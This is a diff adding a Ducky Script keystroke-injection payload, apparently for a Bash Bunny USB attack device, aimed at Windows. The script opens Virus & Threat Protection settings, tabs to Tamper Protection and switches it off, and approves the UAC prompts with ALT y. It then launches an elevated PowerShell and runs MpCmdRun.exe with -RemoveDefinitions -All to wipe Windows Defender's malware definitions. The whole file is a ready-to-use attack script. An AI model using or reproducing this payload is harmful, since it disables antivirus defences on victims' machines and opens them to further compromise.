@@ -1,0 +1,86 @@
+REM Wait for Bunny to start and stabilise
+DELAY 10000
+
+REM Open Virus & Threat Protection GUI
+GUI s
+DELAY 1000
+STRING virus & threat protection
+DELAY 1000
+ENTER
+REM Wait for GUI to start and stabilise
+DELAY 3000
+
+REM Select "Manage Settings"
+REM 1
+TAB
+DELAY 200
+REM 2
+TAB
+DELAY 200
+REM 3
+TAB
+DELAY 200
+REM 4
+TAB
+DELAY 200
+ENTER
+
+DELAY 500
+
+REM Selct "Tamper Protection"
+REM 1
+TAB
+DELAY 200
+REM 2
+TAB
+DELAY 200
+REM 3
+TAB
+DELAY 200
+REM 4
+TAB
+DELAY 200
+
+REM Toggle "Tamper Protection" to OFF
+SPACE
+
+REM Debug
+DELAY 2000
+
+REM Wait for UAC to appear
+DELAY 2000
+
+REM Select "Yes" to allow changes to be made
+ALT y
+
+REM Debug
+DELAY 5000
+
+REM Job done TP disabled
+
+REM Close "Settings" GUI
+DELAY 3000
+ALT F4
+
+REM Launch Powershell
+DELAY 3000
+GUI x
+DELAY 200
+A
+
+REM Wait for UAC to appear
+DELAY 7000
+
+REM Debug
+DELAY 5000
+
+REM Select "Yes" to allow changes to be made
+ALT y
+
+REM Wait for Powershell to launch
+DELAY 4000
+
+REM Enter commands
+STRING & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
+DELAY 200
+ENTER
